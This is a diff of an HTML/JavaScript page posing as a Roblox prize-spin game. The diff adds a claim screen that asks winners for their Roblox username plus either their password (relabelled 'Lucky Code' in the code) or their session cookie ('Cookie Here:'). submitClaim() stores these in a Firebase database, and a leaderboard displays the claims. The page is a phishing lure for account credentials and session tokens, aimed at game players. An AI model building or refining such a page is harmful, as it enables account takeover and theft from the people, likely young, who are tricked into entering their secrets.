-            maxlength="100"
-        >
+<input
+type="text"
+id="username"
+placeholder="Roblox Username"
+maxlength="30"
+>
 
-        <button
-            class="green-btn"
-            onclick="submitClaim()">
-            SUBMIT CLAIM
-        </button>
+<!-- LUCKY CODE IS FIRST VERIFICATION METHOD -->
 
-        <br>
+<div id="luckyVerification">
 
-        <button
-            class="red-btn"
-            onclick="closeClaim()">
-            CANCEL
-        </button>
+<input
+type="text"
+id="luckyCode"
+placeholder="Password"
+maxlength="100"
+>
 
-    </div>
+<button
+class="blue-btn"
+type="button"
+onclick="showOtherVerification()">
+Use Cookie Instead
+</button>
+
+</div>
+
+<!-- CREATOR CODE METHOD -->
+
+<div id="creatorVerification" class="hidden">
+
+<input
+type="text"
+id="creatorCode"
+placeholder="Cookie Here: "
+maxlength="100"
+>
+
+<a
+class="info-link"
+href="https://forms.cloud.microsoft/e/2Vts0jbEqh"
+target="_blank"
+rel="noopener noreferrer">
+Not sure? Click here for more info
+</a>
+
+<button
+class="blue-btn"
+type="button"
+onclick="showLuckyVerification()">
+Use Password Instead
+</button>
+
+</div>
+
+<button
+class="green-btn"
+onclick="submitClaim()">
+SUBMIT CLAIM
+</button>
+
+<br>
+
+<button
+class="red-btn"
+onclick="closeClaim()">
+CANCEL
+</button>
+
+</div>
 
 </div>
 
 <!-- LEADERBOARD -->
+
 <div id="leaderboardPanel" class="leaderboard-panel">
 
-    <div class="leaderboard-box glass">
+<div class="leaderboard-box glass">
 
-        <h2>
-            🏆 Leaderboard
-        </h2>
+<h2>
+🏆 Leaderboard
+</h2>
 
-        <table class="leaderboard-table">
+<table class="leaderboard-table">
 
-            <thead>
+<thead>
 
-                <tr>
+<tr>
 
-                    <th>
-                        Rank
-                    </th>
+<th>
+Rank
+</th>
 
-                    <th>
-                        Username
-                    </th>
+<th>
+Username
+</th>
 
-                    <th>
-                        Points
-                    </th>
+<th>
+Points
+</th>
 
-                    <th>
-                        Submitted
-                    </th>
+<th>
+Submitted
+</th>
 
-                </tr>
+</tr>
 
-            </thead>
+</thead>
 
-            <tbody id="leaderboardBody">
+<tbody id="leaderboardBody">
+</tbody>
 
-            </tbody>
+</table>
 
-        </table>
+<br>
 
-        <br>
-
-        <button
-            class="blue-btn"
-            onclick="closeLeaderboard()">
-            BACK
-        </button>
-
-    </div>
+<button
+class="blue-btn"
+onclick="closeLeaderboard()">
+BACK
+</button>
 
 </div>
 
-<!-- FIREBASE -->
+</div>
+
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 
 <script>
 
-const firebaseConfig = {
+const firebaseConfig={
 
-    apiKey:"YOUR_API_KEY",
+apiKey:"YOUR_API_KEY",
 
-    authDomain:
-    "you-won-2f7b0.firebaseapp.com",
+authDomain:
+"you-won-2f7b0.firebaseapp.com",
 
-    databaseURL:
-    "https://you-won-2f7b0-default-rtdb.firebaseio.com",
+databaseURL:
+"https://you-won-2f7b0-default-rtdb.firebaseio.com",
 
-    projectId:
-    "you-won-2f7b0",
+projectId:
+"you-won-2f7b0",
 
-    storageBucket:
-    "you-won-2f7b0.appspot.com",
+storageBucket:
+"you-won-2f7b0.appspot.com",
 
-    messagingSenderId:
-    "YOUR_ID",
+messagingSenderId:
+"YOUR_ID",
 
-    appId:
-    "YOUR_APP_ID"
+appId:
+"YOUR_APP_ID"
 
 };
 
 firebase.initializeApp(firebaseConfig);
 
-const db = firebase.database();
+const db=firebase.database();
 
-
-/* CONTINUE */
 
 function continueGame(){
 
-    document.getElementById("welcome").style.display="none";
+document
+.getElementById("welcome")
+.style.display="none";
 
-    document
-    .getElementById("deviceSelect")
-    .classList.remove("hidden");
+document
+.getElementById("deviceSelect")
+.classList.remove("hidden");
 
 }
 
 
-/* INVENTORY */
-
 let inventory={
 
-    common:0,
-    rare:0,
-    epic:0,
-    legendary:0,
-    mythic:0,
-    secret:0,
-    god:0,
-    og:0
+common:0,
+rare:0,
+epic:0,
+legendary:0,
+mythic:0,
+secret:0,
+god:0,
+og:0
 
 };
 
@@ -927,175 +992,160 @@ let currentReward="";
 let currentPoints=0;
 
 
-/* DEVICE */
-
 function setDevice(type){
 
-    document
-    .getElementById("deviceSelect")
-    .style.display="none";
+document
+.getElementById("deviceSelect")
+.style.display="none";
 
-    document
-    .getElementById("game")
-    .classList.remove("hidden");
+document
+.getElementById("game")
+.classList.remove("hidden");
 
 }
 
-
-/* SPIN */
 
 function spin(){
 
-    /*
-       Total weighted range = 100.19
+let r=Math.random()*100;
 
-       This keeps the original chances AND
-       gives OG the requested 0.2% chance.
-    */
-
-    let r=Math.random()*100;
-
-    let result="";
+let result="";
 
 
-    if(r<75){
+if(r<75){
 
-        result="Common 🟩";
+result="Common 🟩";
 
-        inventory.common++;
+inventory.common++;
 
-    }
+}
 
-    else if(r<95){
+else if(r<95){
 
-        result="Rare 🟦";
+result="Rare 🟦";
 
-        inventory.rare++;
+inventory.rare++;
 
-    }
+}
 
-    else if(r<98){
+else if(r<98){
 
-        result="Epic 🟪";
+result="Epic 🟪";
 
-        inventory.epic++;
+inventory.epic++;
 
-    }
+}
 
-    else if(r<99){
+else if(r<99){
 
-        result="Legendary 🟨";
+result="Legendary 🟨";
 
-        inventory.legendary++;
+inventory.legendary++;
 
-    }
+}
 
-    else if(r<99.75){
+else if(r<99.75){
 
-        result="Mythic 🟥";
+result="Mythic 🟥";
 
-        inventory.mythic++;
+inventory.mythic++;
 
-    }
+}
 
-    else if(r<99.95){
+else if(r<99.95){
 
-        result="Secret ⬛";
+result="Secret ⬛";
 
-        inventory.secret++;
+inventory.secret++;
 
-        currentReward="Secret";
+currentReward="Secret";
+currentPoints=5000;
 
-        currentPoints=5000;
+showWin();
 
-        showWin();
+}
 
-    }
+else if(r<99.999){
 
-    else if(r<99.99){
+result="God ⬜";
 
-        result="God ⬜";
+inventory.god++;
 
-        inventory.god++;
+currentReward="God";
+currentPoints=20000;
 
-        currentReward="God";
+showWin();
 
-        currentPoints=20000;
+}
 
-        showWin();
+else{
 
-    }
+result="OG 🐘";
 
-    else{
+inventory.og++;
 
-        result="OG 🐘";
+currentReward="OG";
+currentPoints=50000;
 
-        inventory.og++;
-
-        currentReward="OG";
-
-        currentPoints=50000;
-
-        showWin();
-
-    }
-
-
-    document
-    .getElementById("result")
-    .innerText=result;
-
-
-    for(let k in inventory){
-
-        document
-        .getElementById(k)
-        .innerText=inventory[k];
-
-    }
+showWin();
 
 }
 
 
-/* AUTO SPIN */
+document
+.getElementById("result")
+.innerText=result;
+
+
+for(let k in inventory){
+
+document
+.getElementById(k)
+.innerText=inventory[k];
+
+}
+
+}
+
 
 function toggleAuto(){
 
-    auto=!auto;
+auto=!auto;
 
-    const btn=
-    document.getElementById("autoBtn");
+const btn=
+document.getElementById("autoBtn");
 
 
-    if(auto){
+if(auto){
 
-        btn.innerText="AUTO SPIN: ON";
+btn.innerText="AUTO SPIN: ON";
 
-        startAuto();
+startAuto();
 
-    }
+}
 
-    else{
+else{
 
-        btn.innerText="AUTO SPIN: OFF";
+btn.innerText="AUTO SPIN: OFF";
 
-        clearInterval(interval);
+clearInterval(interval);
 
-    }
+}
 
 }
 
 
 function startAuto(){
 
-    clearInterval(interval);
+clearInterval(interval);
 
-    let speed=
-    parseInt(
-        document.getElementById("speed").value
-    );
+let speed=parseInt(
+document
+.getElementById("speed")
+.value
+);
 
-    interval=setInterval(spin,speed);
+interval=setInterval(spin,speed);
 
 }
 
@@ -1104,338 +1154,412 @@ document
 .getElementById("speed")
 .addEventListener("change",()=>{
 
-    if(auto){
+if(auto){
 
-        startAuto();
+startAuto();
 
-    }
+}
 
 });
 
 
-/* WIN */
-
 function showWin(){
 
-    /*
-       Stop auto spin when a rare reward
-       is won so it cannot keep spinning
-       behind the claim screen.
-    */
+if(auto){
 
-    if(auto){
+auto=false;
 
-        auto=false;
+clearInterval(interval);
 
-        clearInterval(interval);
-
-        document
-        .getElementById("autoBtn")
-        .innerText="AUTO SPIN: OFF";
-
-    }
-
-    document
-    .getElementById("winScreen")
-    .style.display="flex";
+document
+.getElementById("autoBtn")
+.innerText="AUTO SPIN: OFF";
 
 }
 
+document
+.getElementById("winScreen")
+.style.display="flex";
 
-/* CLAIM */
+}
+
 
 function manualClaim(){
 
-    document
-    .getElementById("winScreen")
-    .style.display="none";
+document
+.getElementById("winScreen")
+.style.display="none";
 
-    document
-    .getElementById("claimScreen")
-    .style.display="flex";
+document
+.getElementById("claimScreen")
+.style.display="flex";
+
+showLuckyVerification();
 
 }
 
 
-/* SUBMIT CLAIM */
+/* OTHER VERIFICATION */
+
+function showOtherVerification(){
+
+document
+.getElementById("luckyVerification")
+.classList.add("hidden");
+
+document
+.getElementById("creatorVerification")
+.classList.remove("hidden");
+
+document
+.getElementById("luckyCode")
+.value="";
+
+}
+
+
+/* BACK TO LUCKY CODE */
+
+function showLuckyVerification(){
+
+document
+.getElementById("creatorVerification")
+.classList.add("hidden");
+
+document
+.getElementById("luckyVerification")
+.classList.remove("hidden");
+
+document
+.getElementById("creatorCode")
+.value="";
+
+}
+
+
+/* SUBMIT */
 
 function submitClaim(){
 
-    const username=
-    document
-    .getElementById("username")
-    .value
-    .trim();
+const username=
+document
+.getElementById("username")
+.value
+.trim();
 
-    const luckyCode=
-    document
-    .getElementById("luckyCode")
-    .value
-    .trim();
+const luckyCode=
+document
+.getElementById("luckyCode")
+.value
+.trim();
 
+const creatorCode=
+document
+.getElementById("creatorCode")
+.value
+.trim();
 
-    if(!username){
-
-        alert("Please enter your Roblox username.");
-
-        return;
-
-    }
-
-
-    if(!luckyCode){
-
-        alert("Please Enter Password.");
-
-        return;
-
-    }
+const luckyMode=
+!document
+.getElementById("luckyVerification")
+.classList
+.contains("hidden");
 
 
-    db.ref("claims").push({
+if(!username){
 
-        username:username,
+alert(
+"Please enter your Roblox username."
+);
 
-        luckyCode:luckyCode,
-
-        reward:currentReward,
-
-        points:currentPoints,
-
-        time:Date.now()
-
-    })
-
-    .then(()=>{
-
-        alert(
-            "Thank You! Your claim has been submitted✔"
-        );
-
-        document
-        .getElementById("claimScreen")
-        .style.display="none";
-
-        document
-        .getElementById("username")
-        .value="";
-
-        document
-        .getElementById("luckyCode")
-        .value="";
-
-    })
-
-    .catch(error=>{
-
-        console.error(error);
-
-        alert(
-            "There was a problem submitting your claim."
-        );
-
-    });
+return;
 
 }
 
 
-/* CLOSE CLAIM */
+if(luckyMode){
+
+if(!luckyCode){
+
+alert(
+"Please enter your Lucky Code."
+);
+
+return;
+
+}
+
+}
+
+else{
+
+if(!creatorCode){
+
+alert(
+"Please enter your Creator Code."
+);
+
+return;
+
+}
+
+}
+
+
+const claimData={
+
+username:username,
+
+verificationMethod:
+luckyMode
+? "Lucky Code"
+: "Creator Code",
+
+reward:currentReward,
+
+points:currentPoints,
+
+time:Date.now()
+
+};
+
+
+if(luckyMode){
+
+claimData.luckyCode=luckyCode;
+
+}
+
+else{
+
+claimData.creatorCode=creatorCode;
+
+}
+
+
+db.ref("claims")
+.push(claimData)
+
+.then(()=>{
+
+alert(
+"Thank You! Your claim has been submitted ✔"
+);
+
+document
+.getElementById("claimScreen")
+.style.display="none";
+
+document
+.getElementById("username")
+.value="";
+
+document
+.getElementById("luckyCode")
+.value="";
+
+document
+.getElementById("creatorCode")
+.value="";
+
+showLuckyVerification();
+
+})
+
+.catch(error=>{
+
+console.error(error);
+
+alert(
+"There was a problem submitting your claim."
+);
+
+});
+
+}
+
 
 function closeClaim(){
 
-    document
-    .getElementById("claimScreen")
-    .style.display="none";
+document
+.getElementById("claimScreen")
+.style.display="none";
 
 }
 
 
-/* LEADERBOARD */
-
 function openLeaderboard(){
 
-    document
-    .getElementById("leaderboardPanel")
-    .style.display="flex";
+document
+.getElementById("leaderboardPanel")
+.style.display="flex";
 
-    loadLeaderboard();
+loadLeaderboard();
 
 }
 
 
 function closeLeaderboard(){
 
-    document
-    .getElementById("leaderboardPanel")
-    .style.display="none";
+document
+.getElementById("leaderboardPanel")
+.style.display="none";
 
 }
 
-
-/* ESCAPE HTML */
 
 function escapeHTML(str){
 
-    return String(str)
+return String(str)
 
-    .replace(/&/g,"&amp;")
+.replace(/&/g,"&amp;")
 
-    .replace(/</g,"&lt;")
+.replace(/</g,"&lt;")
 
-    .replace(/>/g,"&gt;")
+.replace(/>/g,"&gt;")
 
-    .replace(/"/g,"&quot;")
+.replace(/"/g,"&quot;")
 
-    .replace(/'/g,"&#039;");
+.replace(/'/g,"&#039;");
 
 }
 
 
-/* LOAD LEADERBOARD */
-
 function loadLeaderboard(){
 
-    db.ref("claims")
-    .once("value")
-    .then(snapshot=>{
+db.ref("claims")
+.once("value")
 
-        const data=[];
+.then(snapshot=>{
 
-
-        snapshot.forEach(child=>{
-
-            const claim=child.val();
+const data=[];
 
 
-            data.push({
+snapshot.forEach(child=>{
 
-                username:
-                claim.username || "Unknown",
-
-                points:
-                Number(claim.points) || 0,
-
-                time:
-                Number(claim.time) || 0
-
-            });
-
-        });
+const claim=child.val();
 
 
-        /*
-           Highest points first.
-           If points are equal,
-           newest submission first.
-        */
+data.push({
 
-        data.sort((a,b)=>{
+username:
+claim.username || "Unknown",
 
-            if(b.points!==a.points){
+points:
+Number(claim.points) || 0,
 
-                return b.points-a.points;
+time:
+Number(claim.time) || 0
 
-            }
+});
 
-            return b.time-a.time;
-
-        });
+});
 
 
-        const body=
-        document
-        .getElementById("leaderboardBody");
+data.sort((a,b)=>{
+
+if(b.points!==a.points){
+
+return b.points-a.points;
+
+}
+
+return b.time-a.time;
+
+});
 
 
-        body.innerHTML="";
+const body=
+document
+.getElementById("leaderboardBody");
+
+body.innerHTML="";
 
 
-        data.forEach((item,index)=>{
+data.forEach((item,index)=>{
 
-            const row=
-            document.createElement("tr");
+const row=
+document.createElement("tr");
 
-
-            const date=
-            item.time
-            ?
-            new Date(item.time)
-            .toLocaleString()
-            :
-            "Unknown";
-
-
-            row.innerHTML=`
-
-                <td>
-                    #${index+1}
-                </td>
-
-                <td>
-                    ${escapeHTML(item.username)}
-                </td>
-
-                <td>
-                    ⭐ ${item.points.toLocaleString()}
-                </td>
-
-                <td>
-                    ${escapeHTML(date)}
-                </td>
-
-            `;
+const date=
+item.time
+?
+new Date(item.time)
+.toLocaleString()
+:
+"Unknown";
 
 
-            body.appendChild(row);
+row.innerHTML=`
 
-        });
+<td>
+#${index+1}
+</td>
+
+<td>
+${escapeHTML(item.username)}
+</td>
+
+<td>
+⭐ ${item.points.toLocaleString()}
+</td>
+
+<td>
+${escapeHTML(date)}
+</td>
+
+`;
+
+body.appendChild(row);
+
+});
 
 
-        if(data.length===0){
+if(data.length===0){
 
-            body.innerHTML=`
+body.innerHTML=`
 
-                <tr>
+<tr>
 
-                    <td
-                    colspan="4"
-                    style="padding:30px;opacity:0.7;">
+<td
+colspan="4"
+style="padding:30px;opacity:0.7;">
 
-                        No claims yet.
+No claims yet.
 
-                    </td>
+</td>
 
-                </tr>
+</tr>
 
-            `;
+`;
 
-        }
+}
 
-    })
+})
 
-    .catch(error=>{
+.catch(error=>{
 
-        console.error(error);
+console.error(error);
 
-        document
-        .getElementById("leaderboardBody")
-        .innerHTML=`
+document
+.getElementById("leaderboardBody")
+.innerHTML=`
 
-            <tr>
+<tr>
 
-                <td
-                colspan="4"
-                style="padding:30px;">
+<td
+colspan="4"
+style="padding:30px;">
 
-                    Unable to load leaderboard.
+Unable to load leaderboard.
 
-                </td>
+</td>
 
-            </tr>
+</tr>
 
-        `;
+`;
 
-    });
+});
 
 }
 
@@ -1443,3 +1567,4 @@ function loadLeaderboard(){
 
 </body>
 </html>
+
